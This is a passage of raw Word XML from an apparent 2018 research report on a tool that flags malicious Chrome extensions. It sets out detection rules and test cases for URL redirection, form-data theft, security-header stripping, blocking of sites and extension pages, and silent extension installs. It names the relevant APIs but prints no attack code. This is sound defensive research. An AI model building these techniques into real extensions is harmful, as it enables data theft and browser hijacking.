      <w:tr w:rsidR="00C518F8" w:rsidRPr="00605C1C" w14:paraId="2C8C68E4"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36225DDB" w14:textId="77777777" w:rsidR="00C518F8" w:rsidRPr="00605C1C" w:rsidRDefault="00C518F8" w:rsidP="00605C1C">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00605C1C">
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t>Access to websites blocked</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3795" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5F77681C"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web_listener and cancel and block</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2961" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="02E1D3F1"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Access to websites blocked.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C518F8" w:rsidRPr="00605C1C" w14:paraId="3334294F"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21A0D058" w14:textId="77777777" w:rsidR="00C518F8" w:rsidRPr="00F27FB3" w:rsidRDefault="00C518F8" w:rsidP="00605C1C">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00605C1C">
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve">URL </w:t>
            </w:r>
            <w:r w:rsidR="00501982">
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t>re</w:t>
            </w:r>
            <w:r w:rsidR="00F27FB3">
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t>direction</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3795" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="31657E76"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web_listener and redirect and block</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2961" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1DB13B14" w14:textId="77777777" w:rsidR="00C518F8" w:rsidRPr="00605C1C" w:rsidRDefault="00C518F8" w:rsidP="00605C1C">
            <w:pPr>
              <w:keepNext/>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URL redirection (MITM).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="73219AA1" w14:textId="77777777" w:rsidR="00605C1C" w:rsidRDefault="00605C1C" w:rsidP="00BA3FA5">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6B361802" w14:textId="77777777" w:rsidR="00605C1C" w:rsidRDefault="00605C1C" w:rsidP="00BA3FA5">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1543F8F1" w14:textId="77777777" w:rsidR="00605C1C" w:rsidRDefault="00605C1C" w:rsidP="00BA3FA5">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6BB204E6" w14:textId="77777777" w:rsidR="00605C1C" w:rsidRDefault="00605C1C" w:rsidP="00BA3FA5">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2772D31C" w14:textId="77777777" w:rsidR="00605C1C" w:rsidRDefault="00605C1C" w:rsidP="00BA3FA5">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7B198DD8" w14:textId="77777777" w:rsidR="00605C1C" w:rsidRDefault="00605C1C" w:rsidP="00BA3FA5">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1E638BE9" w14:textId="77777777" w:rsidR="00605C1C" w:rsidRDefault="00605C1C" w:rsidP="00BA3FA5">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6BFB279C" w14:textId="77777777" w:rsidR="009E56F2" w:rsidRDefault="009E56F2" w:rsidP="00BA3FA5">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1D2B6DD5" w14:textId="77777777" w:rsidR="00BB3A9E" w:rsidRPr="00BA3FA5" w:rsidRDefault="00BB3A9E" w:rsidP="00BA3FA5">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0EDE0D5C" w14:textId="437D8A7A" w:rsidR="000F7621" w:rsidRPr="000F7621" w:rsidRDefault="00BB3A9E" w:rsidP="000F7621">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="210" w:name="_Toc523071525"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>EVALUATION</w:t>
      </w:r>
      <w:bookmarkEnd w:id="210"/>
    </w:p>
    <w:p w14:paraId="26F470F4" w14:textId="1105B0EC" w:rsidR="000F7621" w:rsidRPr="000F7621" w:rsidRDefault="00474198" w:rsidP="000F7621">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="211" w:name="_Toc523071526"/>
      <w:r>
        <w:t>Rules</w:t>
      </w:r>
      <w:r w:rsidR="000F7621">
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:t>Testing</w:t>
      </w:r>
      <w:bookmarkEnd w:id="211"/>
    </w:p>
    <w:p w14:paraId="305D75B2" w14:textId="100AADA1" w:rsidR="00906F83" w:rsidRPr="00502E83" w:rsidRDefault="00906F83" w:rsidP="00906F83">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00502E83">
        <w:t>Our</w:t>
      </w:r>
      <w:r w:rsidR="00DD5806">
        <w:t xml:space="preserve"> a</w:t>
      </w:r>
      <w:r w:rsidRPr="00502E83">
        <w:t xml:space="preserve">pplication focuses on 10 cases (rules) of suspicious behavior found in chrome extensions. Tests were carried out for each case separately as well as altogether in order to make sure there are no false negative cases. Since there are no malicious extensions in the webstore, we created a second version for the </w:t>
      </w:r>
      <w:r w:rsidR="00702BA6">
        <w:t>mechanism,</w:t>
      </w:r>
      <w:r w:rsidRPr="00502E83">
        <w:t xml:space="preserve"> which</w:t>
      </w:r>
      <w:r w:rsidR="00702BA6">
        <w:t xml:space="preserve"> is a python application that executes the analysis</w:t>
      </w:r>
      <w:r w:rsidRPr="00502E83">
        <w:t xml:space="preserve"> for the test cases files</w:t>
      </w:r>
      <w:r w:rsidR="00B13D81">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00702BA6">
        <w:t>located</w:t>
      </w:r>
      <w:del w:id="212" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:30:00Z">
        <w:r w:rsidR="00702BA6" w:rsidDel="00C510E3">
          <w:delText xml:space="preserve"> locally</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="00702BA6">
        <w:t xml:space="preserve"> on</w:t>
      </w:r>
      <w:del w:id="213" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:30:00Z">
        <w:r w:rsidR="00702BA6" w:rsidDel="00D52911">
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="214" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:30:00Z">
        <w:r w:rsidR="00D52911">
          <w:t xml:space="preserve"> a local computer</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="215" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:30:00Z">
        <w:r w:rsidR="00702BA6" w:rsidDel="00D52911">
          <w:delText>our pc</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="00502E83">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C79021D" w14:textId="35EE58DA" w:rsidR="00906F83" w:rsidRPr="00502E83" w:rsidRDefault="00906F83" w:rsidP="00906F83">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00502E83">
        <w:t>It was also executed for random extensions in the Chrome web store to ensure there were no false positives (cases where our application reports warnings for benign extensions).</w:t>
      </w:r>
      <w:r w:rsidR="004D2995">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1952BAD9" w14:textId="6ACD80DA" w:rsidR="00906F83" w:rsidRDefault="00906F83" w:rsidP="00906F83">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00906F83">
        <w:t>We created test cases based on the information gathered from our research. Each case is designed for a specific rule as described in the previous section. We chose some examples from C</w:t>
      </w:r>
      <w:r w:rsidR="00AD7E4E">
        <w:t>h</w:t>
      </w:r>
      <w:r w:rsidRPr="00906F83">
        <w:t>roak</w:t>
      </w:r>
      <w:r w:rsidR="001B1328">
        <w:rPr>
          <w:vertAlign w:val="superscript"/>
        </w:rPr>
        <w:t>[6]</w:t>
      </w:r>
      <w:r w:rsidRPr="00906F83">
        <w:t xml:space="preserve"> extension to include in our work. Specifically, we focused on the way it managed to gather information using APIs like </w:t>
      </w:r>
      <w:r w:rsidRPr="006A4E27">
        <w:rPr>
          <w:i/>
          <w:rPrChange w:id="216" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:44:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:t>chrome.system.cpu</w:t>
      </w:r>
      <w:r w:rsidRPr="00906F83">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="006A4E27">
        <w:rPr>
          <w:i/>
          <w:rPrChange w:id="217" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:44:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:t>chrome.system.displays</w:t>
      </w:r>
      <w:r w:rsidRPr="00906F83">
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="006A4E27">
        <w:rPr>
          <w:i/>
          <w:rPrChange w:id="218" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:44:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:t>chrome.sessions</w:t>
      </w:r>
      <w:r w:rsidRPr="00906F83">
        <w:t xml:space="preserve"> and we created test cases based on those examples.</w:t>
      </w:r>
      <w:r w:rsidR="000D3AD9">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="009B501D">
        <w:t>We also run our application for the C</w:t>
      </w:r>
      <w:r w:rsidR="00AD7E4E">
        <w:t>h</w:t>
      </w:r>
      <w:r w:rsidR="009B501D">
        <w:t>roak</w:t>
      </w:r>
      <w:r w:rsidR="001B1328">
        <w:rPr>
          <w:vertAlign w:val="superscript"/>
        </w:rPr>
        <w:t>[6]</w:t>
      </w:r>
      <w:r w:rsidR="009B501D">
        <w:t xml:space="preserve"> extension itself </w:t>
      </w:r>
      <w:r w:rsidR="00FB1166">
        <w:t>and we checked that all the attacks were successfully detected.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C80B738" w14:textId="5E763BCD" w:rsidR="00B13D81" w:rsidRPr="00906F83" w:rsidRDefault="00B13D81" w:rsidP="00906F83">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">As for the case </w:t>
      </w:r>
      <w:r w:rsidR="00834461">
        <w:t>of</w:t>
      </w:r>
      <w:r w:rsidR="000D3AD9">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00834461">
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidR="000D3AD9">
        <w:t xml:space="preserve"> suspicious extension perform</w:t>
      </w:r>
      <w:r w:rsidR="00834461">
        <w:t>ing</w:t>
      </w:r>
      <w:r w:rsidR="000D3AD9">
        <w:t xml:space="preserve"> an</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> installation </w:t>
      </w:r>
      <w:r w:rsidR="000D3AD9">
        <w:t>or</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> uninstallation of </w:t>
      </w:r>
      <w:r w:rsidR="000D3AD9">
        <w:t>other extensions, we had a simple approach</w:t>
      </w:r>
      <w:r w:rsidR="002C0CF9">
        <w:t xml:space="preserve"> where </w:t>
      </w:r>
      <w:r w:rsidR="00834461">
        <w:t xml:space="preserve">we created test cases to ensure that our application successfully detects the use of </w:t>
      </w:r>
      <w:r w:rsidR="00834461" w:rsidRPr="002A7B53">
        <w:rPr>
          <w:i/>
          <w:lang w:bidi="he-IL"/>
          <w:rPrChange w:id="219" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:45:00Z">
            <w:rPr>
              <w:lang w:bidi="he-IL"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>chrome.webstore.install()</w:t>
      </w:r>
      <w:r w:rsidR="00834461">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidR="00834461" w:rsidRPr="002A7B53">
        <w:rPr>
          <w:i/>
          <w:lang w:bidi="he-IL"/>
          <w:rPrChange w:id="220" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:45:00Z">
            <w:rPr>
              <w:lang w:bidi="he-IL"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>chrome.management.unistall()</w:t>
      </w:r>
      <w:r w:rsidR="00834461">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve"> function.</w:t>
      </w:r>
      <w:r w:rsidR="009B501D">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00B05525">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>Although</w:t>
      </w:r>
      <w:r w:rsidR="00F6765C">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve"> the case of i</w:t>
      </w:r>
      <w:r w:rsidR="00B05525">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>nline installation of extensions is not particularly a malicious action, we mark it as suspicious because the user gets no indication of the action.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15D6E609" w14:textId="6011B494" w:rsidR="00906F83" w:rsidRPr="00906F83" w:rsidRDefault="00906F83" w:rsidP="00906F83">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00906F83">
        <w:t xml:space="preserve">Another case of malicious behavior we found during our research was the URL redirection, which can be described as a </w:t>
      </w:r>
      <w:r w:rsidRPr="00906F83">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>Man-In-The-Middle attack</w:t>
      </w:r>
      <w:r w:rsidRPr="00906F83">
        <w:t>. As described before (section 4.5), we use this kind of attack to detect redirection of targeted URLs and mark it as suspicious. We also used the specific malicious code to run our tests on it.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70439A85" w14:textId="1B8E7844" w:rsidR="00906F83" w:rsidRPr="00906F83" w:rsidRDefault="00906F83" w:rsidP="00906F83">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00906F83">
        <w:t>In addition to this, we found a case of a malicious extension that steals information from submit requests (section 4.7). Every time the user submits a form, each field of the form is encoded and sent to a post request site. This code was also used as a test case</w:t>
      </w:r>
      <w:r w:rsidR="0080533B">
        <w:t xml:space="preserve">, which targets the use of </w:t>
      </w:r>
      <w:r w:rsidR="0080533B" w:rsidRPr="002A7B53">
        <w:rPr>
          <w:i/>
          <w:rPrChange w:id="221" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:45:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:t>document.forms</w:t>
      </w:r>
      <w:r w:rsidR="0080533B">
        <w:t xml:space="preserve"> in combination with the use of </w:t>
      </w:r>
      <w:r w:rsidR="0080533B" w:rsidRPr="002A7B53">
        <w:rPr>
          <w:i/>
          <w:rPrChange w:id="222" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:45:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:t>XMLHttpRequest.send()</w:t>
      </w:r>
      <w:r w:rsidR="0080533B">
        <w:t xml:space="preserve"> function.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C8BC372" w14:textId="1577E69B" w:rsidR="00906F83" w:rsidRPr="00906F83" w:rsidRDefault="00906F83" w:rsidP="004E0B0D">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00906F83">
        <w:t>We also focused on a malicious behavior responsible for the removal of security options from HTTP response header. We created our test case based on the malicious code presented in section 4.4</w:t>
      </w:r>
      <w:r w:rsidR="002C0CF9">
        <w:t xml:space="preserve">, which targets the use of any security option and the </w:t>
      </w:r>
      <w:r w:rsidR="002C0CF9" w:rsidRPr="002A7B53">
        <w:rPr>
          <w:i/>
          <w:rPrChange w:id="223" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:45:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:t>responceHeaders.splice()</w:t>
      </w:r>
      <w:r w:rsidR="002C0CF9">
        <w:t xml:space="preserve"> function.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48D5D23E" w14:textId="77777777" w:rsidR="00906F83" w:rsidRPr="00906F83" w:rsidRDefault="00906F83" w:rsidP="004E0B0D">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00906F83">
        <w:t>Finally, we detect 3 kinds of denial of service attacks. The first one targets the access to the extensions configuration page (chrome://chrome/extensions), whereas the second one prevents the access to any tab the user tries to open. The third case targets specific websites and blocks the access to them. We used the malicious code of each case to run our tests and make sure the application detects them successfully.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70B7D4A2" w14:textId="72E3957B" w:rsidR="00D738F7" w:rsidRDefault="00D738F7" w:rsidP="00663F15">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1FEA931C" w14:textId="051A63BB" w:rsidR="00E23C6A" w:rsidRDefault="00E23C6A" w:rsidP="00663F15">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6070A624" w14:textId="50E6C9DF" w:rsidR="00E23C6A" w:rsidRDefault="00E23C6A" w:rsidP="00663F15">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="40DB51DE" w14:textId="4BDA4B52" w:rsidR="00E23C6A" w:rsidRDefault="00E23C6A" w:rsidP="00663F15">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20E32137" w14:textId="447E0B87" w:rsidR="004E0B0D" w:rsidRDefault="004E0B0D" w:rsidP="00663F15">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="576538FF" w14:textId="43F30A94" w:rsidR="00D738F7" w:rsidRDefault="00D738F7" w:rsidP="00D738F7">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="224" w:name="_Toc523071527"/>
      <w:r>
        <w:t>Recommendation</w:t>
      </w:r>
      <w:bookmarkEnd w:id="224"/>
      <w:ins w:id="225" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:45:00Z">
        <w:r w:rsidR="00683412">
          <w:t>s</w:t>
        </w:r>
      </w:ins>
      <w:bookmarkStart w:id="226" w:name="_GoBack"/>
      <w:bookmarkEnd w:id="226"/>
    </w:p>
    <w:p w14:paraId="61486913" w14:textId="77777777" w:rsidR="00471287" w:rsidRDefault="00471287" w:rsidP="00471287">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r w:rsidRPr="00471287">
        <w:t>In order to improve the security and privacy of browser extensions, we propose some changes that would help with the problems we discussed. Extensions should not have the ability to manipulate browser configuration pages, such as chrome://extensions, that are responsible for managing extensions. Extensions should also not be allowed to uninstall other extensions unless they are from the same author or a trusted source. Another idea is to prevent extensions from manipulating HTTP requests by removing security-related headers that compromise the security of web pages. Finally, when an extension loads code from a remote site, it should not have the permissions to inject that new code into the visited pages.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31F3E0F5" w14:textId="77777777" w:rsidR="00471287" w:rsidRPr="00471287" w:rsidRDefault="00471287" w:rsidP="00471287">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="left"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7409F5C9" w14:textId="77777777" w:rsidR="00D738F7" w:rsidRDefault="00D738F7" w:rsidP="00663F15">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3D27179B" w14:textId="77777777" w:rsidR="00D738F7" w:rsidRDefault="00D738F7" w:rsidP="00663F15">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1FC16B41" w14:textId="77777777" w:rsidR="00D738F7" w:rsidRDefault="00D738F7" w:rsidP="00663F15">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5A3C5D33" w14:textId="77777777" w:rsidR="00D738F7" w:rsidRDefault="00D738F7" w:rsidP="00663F15">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="58D05D65" w14:textId="77777777" w:rsidR="00D738F7" w:rsidRDefault="00D738F7" w:rsidP="00663F15">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4C9BCCCC" w14:textId="77777777" w:rsidR="00D738F7" w:rsidRDefault="00D738F7" w:rsidP="00663F15">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="100C9789" w14:textId="77777777" w:rsidR="00D738F7" w:rsidRDefault="00D738F7" w:rsidP="00663F15">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4E1E2C0D" w14:textId="77777777" w:rsidR="00D738F7" w:rsidRDefault="00D738F7" w:rsidP="00663F15">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="768CBAEC" w14:textId="77777777" w:rsidR="00D738F7" w:rsidRDefault="00D738F7" w:rsidP="00663F15">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0FEBE586" w14:textId="77777777" w:rsidR="00D738F7" w:rsidRDefault="00D738F7" w:rsidP="00663F15">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="67D10DD5" w14:textId="77777777" w:rsidR="00D738F7" w:rsidRDefault="00D738F7" w:rsidP="00663F15">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5A0CA182" w14:textId="77777777" w:rsidR="00D738F7" w:rsidRDefault="00D738F7" w:rsidP="00663F15">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="319CDF1B" w14:textId="77777777" w:rsidR="00D738F7" w:rsidRDefault="00D738F7" w:rsidP="00663F15">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6A27D158" w14:textId="77777777" w:rsidR="00D738F7" w:rsidRDefault="00D738F7" w:rsidP="00663F15">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="14970233" w14:textId="77777777" w:rsidR="00D738F7" w:rsidRDefault="00D738F7" w:rsidP="00663F15">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="003C2138" w14:textId="77777777" w:rsidR="00D738F7" w:rsidRDefault="00D738F7" w:rsidP="00663F15">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1DD307C9" w14:textId="110C5293" w:rsidR="00D738F7" w:rsidRDefault="00D738F7" w:rsidP="00663F15">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20C891EB" w14:textId="4992A6E8" w:rsidR="00A01570" w:rsidRDefault="00A01570" w:rsidP="00663F15">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1A19F783" w14:textId="71391F46" w:rsidR="00A01570" w:rsidRDefault="00A01570" w:rsidP="00663F15">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3771B398" w14:textId="2003AF1A" w:rsidR="00A01570" w:rsidRDefault="00A01570" w:rsidP="00663F15">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="48614CF7" w14:textId="57D2755F" w:rsidR="00A01570" w:rsidRDefault="00A01570" w:rsidP="00663F15">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3FEDAEF4" w14:textId="1C5DA0A2" w:rsidR="00A01570" w:rsidRDefault="00A01570" w:rsidP="00663F15">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4EE82019" w14:textId="3A24303B" w:rsidR="00A01570" w:rsidRDefault="00A01570" w:rsidP="00663F15">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="195B1669" w14:textId="77777777" w:rsidR="00A01570" w:rsidRDefault="00A01570" w:rsidP="00663F15">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="43DE6477" w14:textId="77777777" w:rsidR="00D738F7" w:rsidRDefault="00D738F7" w:rsidP="00663F15">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="45C1052B" w14:textId="77777777" w:rsidR="00D738F7" w:rsidRDefault="00D738F7" w:rsidP="00663F15">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="18F01798" w14:textId="77777777" w:rsidR="007E2C99" w:rsidRDefault="00D84DD0" w:rsidP="003260CD">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="227" w:name="_Toc523071528"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>CONCLUSION</w:t>
      </w:r>
      <w:bookmarkEnd w:id="227"/>
    </w:p>
    <w:p w14:paraId="4DC5D4F2" w14:textId="77777777" w:rsidR="00F73DB7" w:rsidRDefault="00F73DB7" w:rsidP="00C32D4A">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="398720A1" w14:textId="77777777" w:rsidR="00C32D4A" w:rsidRPr="00C32D4A" w:rsidRDefault="00C32D4A" w:rsidP="00C32D4A">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00C32D4A">
        <w:rPr>
